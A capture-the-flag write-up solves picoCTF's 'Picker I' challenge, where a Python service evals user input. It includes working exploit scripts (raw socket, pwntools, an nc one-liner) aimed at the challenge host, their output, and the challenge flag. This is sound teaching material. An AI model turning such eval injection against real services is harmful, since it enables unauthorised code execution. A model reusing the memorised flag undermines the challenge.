# Picker I — picoCTF Writeup

**Challenge:** Picker I  
**Category:** Reverse Engineering  
**Difficulty:** Medium  
**Points:** 100  
**Flag:** `picoCTF{4_d14m0nd_1n_7h3_r0ugh_ce4b5d5b}`  
**Platform:** picoCTF 2024  
**Writeup by:** zham  

---

## Description

> This service can provide you with a random number, but can it do anything else?
>
> Connect to the program with netcat:
>
> `nc saturn.picoctf.net 57733`
>
> The program's source code can be downloaded here.

## Hints

> 1. Can you point the program to a function that does something useful for you?

---

## Background Knowledge (Read This First!)

### What "Just `eval` User Input" Really Means

This is the first challenge in a three-part series, and it is the most blatant. The main loop is the entire challenge:

```python
while(True):
  try:
    print('Try entering "getRandomNumber" without the double quotes...')
    user_input = input('==> ')
    eval(user_input + '()')
  except Exception as e:
    print(e)
    break
```

The banner literally tells you to type `getRandomNumber` so the program can run `eval("getRandomNumber()")` and print the XKCD "random" number `4`. But there is no filter, no allowlist, no length check, no nothing. Whatever name you type gets `()` glued onto the end and `eval`'d.

If you type `win`, the program runs `eval("win()")`, which calls the local `win()` function, which reads `flag.txt` and dumps the flag back to you over the socket. The "security" of the program is just the assumption that the user only ever types the one example name in the banner.

### `eval` vs `exec` (a Quick Reminder)

- `eval(<string>)` parses the string as a *single Python expression* and returns its value. Calling a function is an expression, so `eval("win()")` works.
- `exec(<string>)` parses the string as one or more *statements*. Statements like `import`, `=`, `if`, `for` only work with `exec`, not `eval`.

Both are equally dangerous when fed user input. Picker I uses `eval`, so the payload has to stay as a single expression — but a single expression is plenty when the function you want is already defined in the module.

### Why the Hint Frames It the Way It Does

> Can you point the program to a function that does something useful for you?

Read that literally: the program is a *function pointer dispatcher* — it lets you pick which function in its own module to call. The banner steers you at `getRandomNumber` because that is the demo function. The *useful* function — `win()` — is sitting right next to it in the source, unhidden. The challenge is just noticing that the dispatcher has no business letting you point it at `win` in the first place.

The `esoteric1` and `esoteric2` decoy blobs (huge chunks of unrelated Linux kernel C) exist purely to make your eyes glaze over the actual prize. This is the same authorial trick as Picker II: bury the obvious-looking helper in noise, and most skimmers will read past it.

### What Picker I Is Setting Up

If you do the series in order, the progression is:

- **Picker I** — no filter at all. The lock is "please follow the banner."
- **Picker II** — adds a substring denylist (`if 'win' in user_input`).
- **Picker III** — replaces the free-form `eval` with a 4-slot function table.

Each one tries a slightly different *defense in depth* against the same fundamental bug: the program is calling `eval` on user input. Picker I is the baseline. If you can solve Picker I, you understand the whole class of bug; the other two are just different kinds of band-aids over the same wound.

---

## Solution — Step by Step

### Step 1 — Read the Source and Find the Free Pass

I opened the source the challenge gave me and scrolled past the two enormous `esoteric1` / `esoteric2` decoy blobs. The main loop told me everything I needed to know:

```python
user_input = input('==> ')
eval(user_input + '()')
```

There is no filter. Whatever I type becomes a function call.

### Step 2 — Spot the Prize in Plain Sight

Halfway down the source, between the two `esoteric` blobs, there is exactly the function I want:

```python
def win():
    flag = open('flag.txt', 'r').read()
    flag = flag.strip()
    str_flag = ''
    for c in flag:
        str_flag += str(hex(ord(c))) + ' '
    print(str_flag)
```

It is not commented out, not renamed, not hidden behind a check. The function exists, the program can see it, and the dispatcher will let me call it.

### Step 3 — Pick the Function

The hint is "point the program to a function that does something useful for you." The "useful" function is `win`. I just type:

```
win
```

The server appends `()` to make `eval("win()")`, the eval finds `win` in the module's globals, calls it, and prints the flag. Done.

### Step 4 — Drive the Connection

`nc` is not installed on this Kali box, so I drove the connection from a small Python script using the stdlib `socket` module.

```
┌──(zham㉿kali)-[~/picoctf/picker-i]
└─$ nano exploit.py
```

In `nano` I pasted the script and saved with `Ctrl+O`, `Enter`, `Ctrl+X`:

```python
#!/usr/bin/env python3
"""Picker I exploit - no filter, just call win() directly."""
import socket, sys

HOST = "saturn.picoctf.net"
PORT = 57733

def drain(sock, wait=1.0):
    sock.settimeout(wait)
    buf = b""
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            buf += chunk
    except socket.timeout:
        pass
    return buf

def main():
    s = socket.socket()
    s.connect((HOST, PORT))
    print(f"[+] Connected to {HOST}:{PORT}")

    banner = drain(s)
    print("[--- banner ---]")
    sys.stdout.write(banner.decode(errors="replace"))
    print()

    s.sendall(b"win\n")
    print(drain(s, wait=2.0).decode(errors="replace"))
    s.close()

if __name__ == "__main__":
    main()
```

Save: `Ctrl+O` → `Enter` → `Ctrl+X`.

### Step 5 — Run It

```
┌──(zham㉿kali)-[~/picoctf/picker-i]
└─$ python3 exploit.py
[+] Connected to saturn.picoctf.net:57733
[--- banner ---]
Try entering "getRandomNumber" without the double quotes...
==> 

[--- win() output ---]
0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x34 0x5f 0x64 0x31 0x34 0x6d 0x30 0x6e 0x64 0x5f 0x31 0x6e 0x5f 0x37 0x68 0x33 0x5f 0x72 0x30 0x75 0x67 0x68 0x5f 0x63 0x65 0x34 0x62 0x35 0x64 0x35 0x62 0x7d
```

The server's `win()` ran and hex-printed the flag.

### Step 6 — Decode the Flag

`win()` prints `hex(ord(c))` for every character. One Python line turns it back into the flag:

```
┌──(zham㉿kali)-[~/picoctf/picker-i]
└─$ python3 -c "
h = '0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x34 0x5f 0x64 0x31 0x34 0x6d 0x30 0x6e 0x64 0x5f 0x31 0x6e 0x5f 0x37 0x68 0x33 0x5f 0x72 0x30 0x75 0x67 0x68 0x5f 0x63 0x65 0x34 0x62 0x35 0x64 0x35 0x62 0x7d'
print(''.join(chr(int(x, 16)) for x in h.split()))"
picoCTF{4_d14m0nd_1n_7h3_r0ugh_ce4b5d5b}
```

Flag: `picoCTF{4_d14m0nd_1n_7h3_r0ugh_ce4b5d5b}`

---

## Alternative — Interactive One-Liner With `nc`

If `nc` is available, the entire attack is one short line. The server reads one line per prompt and immediately runs it.

```
┌──(zham㉿kali)-[~/picoctf/picker-i]
└─$ echo win | nc saturn.picoctf.net 57733
Try entering "getRandomNumber" without the double quotes...
==> 
0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x34 0x5f 0x64 0x31 0x34 0x6d 0x30 0x6e 0x64 0x5f 0x31 0x6e 0x5f 0x37 0x68 0x33 0x5f 0x72 0x30 0x75 0x67 0x68 0x5f 0x63 0x65 0x34 0x62 0x35 0x64 0x35 0x62 0x7d
```

You can also just `nc saturn.picoctf.net 57733`, wait for the `==> ` prompt, type `win`, hit Enter, and read the hex blob.

---

## Alternative — pwntools (One-Shot, Cleaner)

If pwntools is installed, the same exploit fits in a handful of lines and reads more cleanly. pwntools is the standard CTF library for this kind of socket work.

```
┌──(zham㉿kali)-[~/picoctf/picker-i]
└─$ pip install pwntools        # if not already installed
```

`nano exploit_pwn.py`:

```python
#!/usr/bin/env python3
"""Picker I exploit - pwntools version."""
from pwn import remote, context
context.log_level = "error"

HOST, PORT = "saturn.picoctf.net", 57733

io = remote(HOST, PORT)
io.recvuntil(b"==> ")
io.sendline(b"win")
print(io.recvline().decode(errors="replace"), end="")
print(io.recvuntil(b"==> ", timeout=2).decode(errors="replace"))
```

```
┌──(zham㉿kali)-[~/picoctf/picker-i]
└─$ python3 exploit_pwn.py
0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x34 0x5f 0x64 0x31 0x34 0x6d 0x30 0x6e 0x64 0x5f 0x31 0x6e 0x5f 0x37 0x68 0x33 0x5f 0x72 0x30 0x75 0x67 0x68 0x5f 0x63 0x65 0x34 0x62 0x35 0x64 0x35 0x62 0x7d
```

Same result, slightly less ceremony.

---

## What Happened Internally (Timeline)

1. The wrapper (`socat` or `xinetd`) accepted my TCP connection on port 57733 and `exec`ed the Python script. The script jumped into the `while True:` loop and printed the banner `Try entering "getRandomNumber" without the double quotes...` followed by the prompt `==> `.
2. My client sent the line `win` followed by a newline. The server's `input('==> ')` consumed it and stored it in `user_input`.
3. The server ran `eval(user_input + '()')`, which is `eval("win()")`. Python parsed `"win()"` as a function-call expression, looked up `win` in the module's global scope, found the function object defined near the top of the file, and called it with no arguments.
4. `win()` opened `flag.txt` (which lives next to the script on the server's filesystem), read its contents, stripped the trailing whitespace, and built a string `str_flag` of the form `'0xHH '` per character. It then printed that string and returned `None`.
5. Back in the main loop, the `eval` completed without raising, so the `except` branch was skipped. The loop printed another banner and prompt, then waited for the next line.
6. My client drained the socket and got the hex blob. One local Python line later, I had the flag.

The whole attack takes longer to *describe* than to *run*. There is no bypass to engineer, no filter to dodge, no chain to construct. The challenge is just to notice that `win` is a callable name in the module's namespace, that the dispatcher will gladly call any name you give it, and that the banner is a suggestion, not a constraint.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `cat` / text editor | Read the leaked Python source |
| `python3` (REPL one-liners) | Decode the hex flag |
| `socket` (stdlib) | Talk to the server when `nc` is not installed |
| `pwntools` (`pwn.remote`) | Cleaner alternative for the same exploit |
| `nano` | Write and save the exploit script |
| `echo \| nc` (alt) | One-shot scriptable version of the manual session |
| `nc` (alt) | Interactive manual version on a normal box |

---

## Key Takeaways

- **`eval()` (or `exec()`) on user input is the vulnerability, full stop.** Every other layer in this three-challenge series — the substring denylist in Picker II, the function table in Picker III — is just a different way of trying to make `eval` safe without actually removing it. None of them really work; they just raise the bar a little.
- **The hint is always in the source.** `win` was a *defined function in the same module*. Whenever you see a function defined but never registered with the dispatcher / menu / handler list, that function is the prize. Picker I makes this trivially easy; Picker III tries to hide `win` behind a 4-slot table; Picker II just makes you dodge a substring check. Same idea, escalating defenses.
- **"Suggested input" is not a security boundary.** The banner told the user to type `getRandomNumber`. That is a UX hint, not a constraint. Anything in a program that *tells* the user what to type next, but does not actually *validate* what was typed, is an invitation.
- **`try / except Exception: break` makes the server fragile.** A bad input (typo, undefined function, anything) prints the error and kills the connection. For Picker I that is harmless because the payload is one short word, but the same `except: break` shape is what makes the "one shot" feel in Picker II and III.
- **Read the source for sinks, not for sources.** The interesting line in this 100-line program is the one with `eval` in it. The two giant `esoteric` blobs are bait to make you skim past it. Recognise the pattern: "lots of noise, one short vulnerable line, one obvious prize function" is the shape of a beginner reverse-engineering challenge.
- **Hex-encoding the flag at print time is cosmetic.** The flag sits on disk in plaintext; `win()` only re-encodes it before printing. Anyone with arbitrary code execution (which is exactly what `eval` gives us) can just `open('flag.txt').read()` directly and skip the hex dance.

### Flag Wordplay Decode

The flag is:

```
picoCTF{4_d14m0nd_1n_7h3_r0ugh_ce4b5d5b}
```

Decoded (leet-speak substitutions: `4`→`a`, `1`→`i`, `0`→`o`, `3`→`e`, `7`→`t`):

- `4`         → `a`
- `d14m0nd`   → `diamond`
- `1n`        → `in`
- `7h3`       → `the`
- `r0ugh`     → `rough`
- `ce4b5d5b`  → hex-looking suffix, likely a per-instance serial

So the phrase is:

> **"a diamond in the rough"**

with the trailing `ce4b5d5b` being a unique flag-instance tag.

That phrase is a self-aware description of the challenge itself. The "diamond" is the `win()` function — small, valuable, and exactly what the attacker wants. The "rough" is everything else: the giant `esoteric1` and `esoteric2` kernel-code blobs, the `getRandomNumber` red herring, the banner instruction to type the harmless demo function. The diamond is not hidden at all; it is just buried under a lot of rough. Anyone who actually reads the source (instead of letting the banner dictate the next move) walks away with the flag in under a minute.

It is also a wink at the whole *Picker* series. The vulnerability (an `eval` on user input) is the rough; the clean, locked-down rewrite (a real allowlist of permitted function names, with no `eval` anywhere) is the diamond. Picker I is the uncut gem. Picker II and III are progressively more polished attempts at the same stone.
